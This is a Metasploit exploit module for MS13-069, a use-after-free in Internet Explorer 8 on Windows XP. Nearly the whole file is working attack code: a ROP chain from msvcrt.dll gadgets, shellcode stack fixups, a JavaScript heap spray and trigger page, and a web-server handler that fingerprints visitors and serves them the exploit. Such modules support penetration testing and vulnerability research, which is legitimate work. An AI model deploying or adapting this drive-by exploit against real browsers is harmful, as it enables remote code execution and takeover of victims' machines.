##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS13-069 Microsoft Internet Explorer CCaret Use-After-Free",
      'Description'    => %q{
        This module exploits a use-after-free vulnerability found in Internet Explorer,
        specifically in how the browser handles the caret (text cursor) object. In IE's standards
        mode, the caret handling's vulnerable state can be triggered by first setting up an
        editable page with an input field, and then we can force the caret to update in an
        onbeforeeditfocus event by setting the body's innerHTML property. In this event handler,
        mshtml!CCaret::`vftable' can be freed using a document.write() function, however,
        mshtml!CCaret::UpdateScreenCaret remains unaware of this change, and still uses the
        same reference to the CCaret object. When the function tries to use this invalid reference
        to call a virtual function at offset 0x2c, it finally results a crash. Precise control of
        the freed object allows arbitrary code execution under the context of the user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'corelanc0d3r', # Vuln discovery & PoC (@corelanc0d3r)
          'sinn3r'        # Metasploit           (@_sinn3r)
        ],
      'References'     =>
        [
          [ 'CVE', '2013-3205' ],
          [ 'OSVDB', '97094' ],
          [ 'MSB', 'MS13-069'  ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-217/' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [
            # Win 7 target on hold until we have a stable custom spray for it
            'IE 8 on Windows XP SP3',
            {
              'Rop'         => :msvcrt,
              'TargetAddr'  => 0x1ec20101, # Allocs @ 1ec20020 (+0xe1 bytes to be null-byte free) - in ecx
              'PayloadAddr' => 0x1ec20105, # where the ROP payload begins
              'Pivot'       => 0x77C4FA1A, # mov esp,ebx; pop ebx; ret
              'PopESP'      => 0x77C37422, # pop esp; ret (pivot to a bigger space)
              'Align'       => 0x77c4d801  # add esp, 0x2c; ret (ROP gadget to jmp over pivot gadget)
            }
          ]
        ],
      'Payload'        =>
        {
          # Our property sprays dislike null bytes
          'BadChars' => "\x00",
          # Fix the stack again before the payload is executed.
          # If we don't do this, meterpreter fails due to a bad socket.
          'Prepend'        => "\x64\xa1\x18\x00\x00\x00" + # mov eax, fs:[0x18]
                              "\x83\xC0\x08"             + # add eax, byte 8
                              "\x8b\x20"                 + # mov esp, [eax]
                              "\x81\xC4\x30\xF8\xFF\xFF",  # add esp, -2000
          # Fall back to the previous allocation so we have plenty of space
          # for the decoder to use
          'PrependEncoder' => "\x81\xc4\x80\xc7\xfe\xff"   # add esp, -80000

        },
      'DefaultOptions' =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Privileged'     => false,
      'DisclosureDate' => "Sep 10 2013",
      'DefaultTarget'  => 0))
  end


  def get_target(agent)
    return target if target.name != 'Automatic'

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
    ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

    ie_name = "IE #{ie}"

    case nt
    when '5.1'
      os_name = 'Windows XP SP3'
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        return t
      end
    end

    nil
  end


  def get_payload(t)
      rop =
      [
        0x77c1e844, # POP EBP # RETN [msvcrt.dll]
        0x77c1e844, # skip 4 bytes [msvcrt.dll]
        0x77c4fa1c, # POP EBX # RETN [msvcrt.dll]
        0xffffffff,
        0x77c127e5, # INC EBX # RETN [msvcrt.dll]
        0x77c127e5, # INC EBX # RETN [msvcrt.dll]
        0x77c4e0da, # POP EAX # RETN [msvcrt.dll]
        0x2cfe1467, # put delta into eax (-> put 0x00001000 into edx)
        0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
        0x77c58fbc, # XCHG EAX,EDX # RETN [msvcrt.dll]
        0x77c34fcd, # POP EAX # RETN [msvcrt.dll]
        0x2cfe04a7, # put delta into eax (-> put 0x00000040 into ecx)
        0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
        0x77c14001, # XCHG EAX,ECX # RETN [msvcrt.dll]
        0x77c3048a, # POP EDI # RETN [msvcrt.dll]
        0x77c47a42, # RETN (ROP NOP) [msvcrt.dll]
        0x77c46efb, # POP ESI # RETN [msvcrt.dll]
        0x77c2aacc, # JMP [EAX] [msvcrt.dll]
        0x77c3b860, # POP EAX # RETN [msvcrt.dll]
        0x77c1110c, # ptr to &VirtualAlloc() [IAT msvcrt.dll]
        0x77c12df9, # PUSHAD # RETN [msvcrt.dll]
        0x77c35459  # ptr to 'push esp #  ret ' [msvcrt.dll]
      ].pack("V*")

    # This data should appear at the beginning of the target address (see TargetAddr in metadata)
    p = ''
    p << rand_text_alpha(225)                     # Padding to avoid null byte addr
    p << [t['TargetAddr']].pack("V*")             # For mov ecx,dword ptr [eax]
    p << [t['Align']].pack("V*") * ( (0x2c-4)/4 ) # 0x2c bytes to pivot (-4 for TargetAddr)
    p << [t['Pivot']].pack("V*")                  # Stack pivot
    p << rand_text_alpha(4)                       # Padding for the add esp,0x2c alignment
    p << rop                                      # ROP chain
    p << payload.encoded                          # Actual payload

    return p
  end


  #
  # Notes:
  # * A custom spray is used (see function putPayload), because document.write() keeps freeing
  #   our other sprays like js_property_spray or the heaplib + substring approach. This spray
  #   seems unstable for Win 7, we'll have to invest more time on that.
  # * Object size = 0x30
  #
  def get_html(t)
    js_payload_addr = ::Rex::Text.to_unescape([t['PayloadAddr']].pack("V*"))
    js_target_addr  = ::Rex::Text.to_unescape([t['TargetAddr']].pack("V*"))
    js_pop_esp      = ::Rex::Text.to_unescape([t['PopESP']].pack("V*"))
    js_payload      = ::Rex::Text.to_unescape(get_payload(t))
    js_rand_dword   = ::Rex::Text.to_unescape(rand_text_alpha(4))

    html = %Q|<!DOCTYPE html>
    <html>
    <head>
    <script>
    var freeReady = false;

    function getObject() {
      var obj = '';
      for (i=0; i < 11; i++) {
        if (i==1) {
          obj += unescape("#{js_pop_esp}");
        }
        else if (i==2) {
          obj += unescape("#{js_payload_addr}");
        }
        else if (i==3) {
          obj += unescape("#{js_target_addr}");
        }
        else {
          obj += unescape("#{js_rand_dword}");
        }
      }
      obj += "\\u4545";
      return obj;
    }

    function emptyAllocator(obj) {
      for (var i = 0; i < 40; i++)
      {
        var e = document.createElement('div');
        e.className = obj;
      }
    }

    function spray(obj) {
      for (var i = 0; i < 50; i++)
      {
        var e = document.createElement('div');
        e.className = obj;
        document.appendChild(e);
      }
    }

    function putPayload() {
      var p = unescape("#{js_payload}");
      var block = unescape("#{js_rand_dword}");
      while (block.length < 0x80000) block += block;
      block = p + block.substring(0, (0x80000-p.length-6)/2);

      for (var i = 0; i < 0x300; i++)
      {
        var e = document.createElement('div');
        e.className = block;
        document.appendChild(e);
      }
    }

    function trigger() {
      if (freeReady) {
        var obj = getObject();
        emptyAllocator(obj);
        document.write("#{rand_text_alpha(1)}");
        spray(obj);
        putPayload();
      }
    }

    window.onload = function() {
      document.body.contentEditable = 'true';
      document.execCommand('InsertInputPassword');
      document.body.innerHTML = '#{rand_text_alpha(1)}';
      freeReady = true;
    }
    </script>
    </head>
    <body onbeforeeditfocus="trigger()">
    </body>
    </html>
    |

    html.gsub(/^\x20\x20\x20\x20/, '')
  end


  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    t = get_target(agent)

    unless t
      print_error("Not a suitable target: #{agent}")
      send_not_found(cli)
      return
    end

    html = get_html(t)

    print_status("Sending exploit...")
    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})
  end

end

=begin

In mshtml!CCaret::UpdateScreenCaret function:
.text:63620F82                 mov     ecx, [eax]      ; crash
.text:63620F84                 lea     edx, [esp+110h+var_A4]
.text:63620F88                 push    edx
.text:63620F89                 push    eax
.text:63620F8A                 call    dword ptr [ecx+2Ch]
  
=end
